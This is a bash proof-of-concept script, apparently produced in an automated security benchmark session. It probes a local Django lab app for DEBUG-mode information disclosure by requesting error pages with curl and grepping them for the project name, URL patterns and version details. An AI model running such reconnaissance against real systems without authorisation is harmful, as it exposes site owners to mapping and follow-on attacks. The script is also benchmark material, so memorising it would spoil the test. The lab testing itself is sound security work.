#!/bin/bash
# POC: POC to demonstrate DEBUG mode information disclosure in Django application, showing exposure of sensitive configuration details, URL patterns, project name, and version information
# Target: ./repo
# Created: 2025-11-07T18:58:41.232Z
# Session: benchmark-XBEN-056-24-mhp7ee7e

# DEBUG Mode Information Disclosure POC
# This script demonstrates how DEBUG=True in Django exposes sensitive information
# including URL patterns, project configuration, and version details

TARGET_URL="http://localhost:8081"

echo "=========================================="
echo "DEBUG Mode Information Disclosure POC"
echo "=========================================="
echo ""

# Test 1: Access non-existent endpoint to trigger 404 error page
echo "[*] Test 1: Accessing non-existent endpoint to trigger DEBUG error page"
echo "[*] Target: $TARGET_URL/nonexistent"
echo ""

RESPONSE=$(curl -s "$TARGET_URL/nonexistent")

# Check if DEBUG information is exposed
if echo "$RESPONSE" | grep -q "DEBUG = True"; then
    echo "[✓] VULNERABLE: DEBUG = True is explicitly shown in error page"
else
    echo "[✗] DEBUG = True not found"
fi

# Check for project name disclosure
if echo "$RESPONSE" | grep -q "ssti_secret_art_gallery"; then
    echo "[✓] VULNERABLE: Project name 'ssti_secret_art_gallery' exposed"
else
    echo "[✗] Project name not found"
fi

# Check for URL patterns disclosure
if echo "$RESPONSE" | grep -q "accounts/\|urlpatterns"; then
    echo "[✓] VULNERABLE: URL patterns and endpoints exposed"
else
    echo "[✗] URL patterns not found"
fi

# Check for Django version disclosure
if echo "$RESPONSE" | grep -q "Django\|Python"; then
    echo "[✓] VULNERABLE: Django/Python version information exposed"
else
    echo "[✗] Version information not found"
fi

# Check for detailed error context
if echo "$RESPONSE" | grep -q "Using the URLconf\|URL pattern\|Requested URL"; then
    echo "[✓] VULNERABLE: Detailed URL configuration context exposed"
else
    echo "[✗] URL configuration context not found"
fi

echo ""
echo "[*] Test 2: Checking for CSRF error page with configuration disclosure"
echo ""

# Try a CSRF error to see if configuration details are leaked
CSRF_RESPONSE=$(curl -s -X POST "$TARGET_URL/accounts/register/step1/" -d "name=test" 2>/dev/null)

if echo "$CSRF_RESPONSE" | grep -q "CSRF\|csrf"; then
    if echo "$CSRF_RESPONSE" | grep -q "DEBUG = True\|Reason given"; then
        echo "[✓] VULNERABLE: CSRF error page exposes DEBUG information and configuration"
    fi
fi

echo ""
echo "[*] Test 3: Extracting exposed URL patterns"
echo ""

# Extract and display URL patterns from the response
URL_PATTERNS=$(echo "$RESPONSE" | grep -oP '(?<=<li>\^).*?(?=\$)' | head -5)
if [ ! -z "$URL_PATTERNS" ]; then
    echo "[✓] Discovered URL patterns:"
    echo "$URL_PATTERNS" | while read pattern; do
        echo "    - $pattern"
    done
else
    echo "[*] URL patterns extraction (alternative method):"
    echo "$RESPONSE" | grep -oP "path\(['\"].*?['\"]" | head -5
fi

echo ""
echo "=========================================="
echo "Vulnerability Confirmed: DEBUG Mode enabled in production"
echo "This exposes sensitive application architecture and configuration details"
echo "=========================================="